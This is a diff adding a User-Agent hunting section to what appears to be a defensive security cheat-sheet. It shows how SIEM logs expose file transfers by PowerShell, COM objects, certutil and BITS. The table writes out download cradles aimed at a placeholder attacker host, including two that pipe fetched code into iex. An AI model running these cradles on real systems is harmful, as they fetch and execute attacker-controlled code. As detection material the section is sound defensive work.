@@ -55,6 +55,7 @@
 - `8` **Log Analysis & SIEM**
   - `8.1` **Splunk**
   - `8.2` **Sysmon & Event Logs**
+  - `8.3` **Malicious File Transfer Detection (User-Agent Hunting)**
 - `9` **Network Analysis**
   - `9.1` **Wireshark**
   - `9.2` **Network Miner**
@@ -1076,6 +1077,39 @@ index="*"
 - Requires a configuration file for granular control over what is logged.
 
 **Reference:** [Ultimate Windows Security Log Encyclopedia](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx)
+
+</details>
+
+### 8.3 Malicious File Transfer Detection (User-Agent Hunting)
+
+Every HTTP client sends a **User-Agent** the server logs, so transferred files can be hunted by the UA of the tool that moved them. Build a whitelist of known-legitimate UAs in the SIEM and investigate anomalies.
+
+Observed UAs from common HTTP file-transfer techniques:
+
+| Technique | Client command | User-Agent observed |
+|---|---|---|
+| `Invoke-WebRequest` / `Invoke-RestMethod` | `Invoke-WebRequest http://<ATTACKER_IP>/<FILE> -OutFile <OUT>` | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0` |
+| `WinHttpRequest` COM object | `$h=new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET','http://<ATTACKER_IP>/<FILE>',$false); $h.send(); iex $h.ResponseText` | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
+| `Msxml2.XMLHTTP` COM object | `$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://<ATTACKER_IP>/<FILE>',$false); $h.send(); iex $h.responseText` | `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)` |
+| `certutil -urlcache` | `certutil -urlcache -split -f http://<ATTACKER_IP>/<FILE>` | `Microsoft-CryptoAPI/10.0` |
+| BITS (`bitsadmin` / `Start-BitsTransfer`) | `Start-BitsTransfer 'http://<ATTACKER_IP>/<FILE>' $env:temp\<FILE>` | `Microsoft BITS/7.8` |
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Detecting malicious file transfers by the User-Agent of the HTTP client that performed them — applies to browsers, cURL, custom scripts, sqlmap/Nmap, PowerShell, COM objects, certutil, and BITS alike.
+- Whitelisting legit UAs in the SIEM (Splunk §8.1) highlights anomalies for follow-up; suspicious strings get correlated with other logs (process creation, network connections) to determine if they moved anything malicious.
+- The PowerShell UA embeds the exact PowerShell version (`5.1.14393.0`) — useful for matching a UA against the installed PowerShell build during an incident.
+
+**Notes**
+
+- BITS sends a `HEAD` request before the download and uses the `Microsoft BITS/7.8` UA — hunt on the HEAD too. BITS jobs also leave artifacts recoverable with BitsParser (10.2).
+- `certutil` requests carry `Cache-Control: no-cache` and `Pragma: no-cache` headers alongside `Microsoft-CryptoAPI/10.0`.
+- `WinHttpRequest` and `Msxml2` COM downloads are typically piped straight into `iex` (fileless) — correlate the UA with Sysmon Event ID 1 (process creation) / 3 (network connection) for the PowerShell host process.
+- Spoofed browser UAs are a giveaway too: PowerShell's `PSUserAgent` strings are frozen from ~2010 (`Chrome/7.0.500.0`, `Firefox/4.0`), so a decade-old browser UA is arguably more suspicious than the default `WindowsPowerShell/5.x` one.
+- Correlate the attacker-side technique with the transfer methods in red-team-methodology.md §4.5 (certutil, BITS, PowerShell cradles).
 
 </details>
 
